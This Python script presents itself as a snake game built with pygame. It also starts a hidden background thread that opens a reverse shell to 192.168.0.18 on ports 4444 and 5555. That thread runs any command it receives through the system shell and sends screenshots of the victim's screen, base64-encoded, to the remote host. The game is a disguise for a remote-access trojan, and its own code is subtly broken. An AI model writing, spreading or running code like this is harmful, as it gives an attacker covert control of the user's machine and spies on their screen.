import threading as th, socket as sk, subprocess as sp, os, base64 as b64, pyautogui as pg, pygame as pgm, random as rnd

def g1():
    pgm.init()
    W, H, WHT, BLK, RD, GRN, BLK_SZ = 600, 400, (255, 255, 255), (0, 0, 0), (255, 0, 0), (0, 255, 0), 10
    scr = pgm.display.set_mode((W, H))
    pgm.display.set_caption("S")
    clk, SSPD = pgm.time.Clock(), 15

    def d_snake(b, s_list):
        for bl in s_list:
            pgm.draw.rect(scr, GRN, [bl[0], bl[1], b, b])

    def g_loop():
        go, gc, x, y, xc, yc, s_list, s_len = False, False, W // 2, H // 2, 0, 0, [], 1
        fx, fy = rnd.randrange(0, W - BLK_SZ, 10), rnd.randrange(0, H - BLK_SZ, 10)

        while not go:
            while gc:
                scr.fill(WHT)
                fnt = pgm.font.SysFont(None, 35)
                scr.blit(fnt.render("G! Q-Q or C-R", True, RD), [W / 6, H / 3])
                pgm.display.update()

                for e in pgm.event.get():
                    if e.type == pgm.KEYDOWN and e.key in (pgm.K_q, pgm.K_c):
                        (lambda: (setattr(go, True), setattr(gc, False)) if e.key == pgm.K_q else g_loop())()

            for e in pgm.event.get():
                if e.type in (pgm.QUIT, pgm.KEYDOWN) and e.type == pgm.QUIT:
                    go = True
                elif e.type == pgm.KEYDOWN:
                    xc, yc = (0, -BLK_SZ) if e.key == pgm.K_UP else (0, BLK_SZ) if e.key == pgm.K_DOWN else (-BLK_SZ, 0) if e.key == pgm.K_LEFT else (BLK_SZ, 0) if e.key == pgm.K_RIGHT else (xc, yc)

            if x in (-1, W) or y in (-1, H):
                gc = True

            x, y = x + xc, y + yc
            scr.fill(BLK)
            pgm.draw.rect(scr, RD, [fx, fy, BLK_SZ, BLK_SZ])

            sh = [x, y]
            s_list.append(sh)

            if len(s_list) > s_len:
                del s_list[0]

            if any(bl == sh for bl in s_list[:-1]):
                gc = True

            d_snake(BLK_SZ, s_list)
            pgm.display.update()

            if x == fx and y == fy:
                fx, fy = rnd.randrange(0, W - BLK_SZ, 10), rnd.randrange(0, H - BLK_SZ, 10)
                s_len += 1

            clk.tick(SSPD)

        pgm.quit()

    g_loop()

def r_shell():
    h, c_p, d_p = "192.168.0.18", 4444, 5555
    c_sock, d_sock = sk.socket(sk.AF_INET, sk.SOCK_STREAM), sk.socket(sk.AF_INET, sk.SOCK_STREAM)
    c_sock.connect((h, c_p))
    d_sock.connect((h, d_p))

    while True:
        cmd = c_sock.recv(1024).decode("utf-8").strip()
        if cmd == "exit":
            break
        elif cmd.startswith("cd "):
            try:
                os.chdir(cmd[3:].strip())
                c_sock.send(f"CD: {os.getcwd()}".encode("utf-8"))
            except FileNotFoundError as e:
                c_sock.send(f"E: {e}".encode("utf-8"))
        elif cmd == "screenshot":
            try:
                img = pg.screenshot()
                img.save("scr.png")
                with open("scr.png", "rb") as f:
                    d_sock.sendall(b64.b64encode(f.read()))
                os.remove("scr.png")
            except Exception as e:
                c_sock.send(f"SE: {e}".encode("utf-8"))
        else:
            try:
                out = sp.run(cmd, shell=True, capture_output=True)
                c_sock.send(out.stdout + out.stderr)
            except Exception as e:
                c_sock.send(f"E: {e}".encode("utf-8"))

    c_sock.close()
    d_sock.close()

if __name__ == "__main__":
    t1, t2 = th.Thread(target=r_shell, daemon=True), th.Thread(target=g1, daemon=True)
    t1.start()
    t2.start()
    t1.join()
    t2.join()

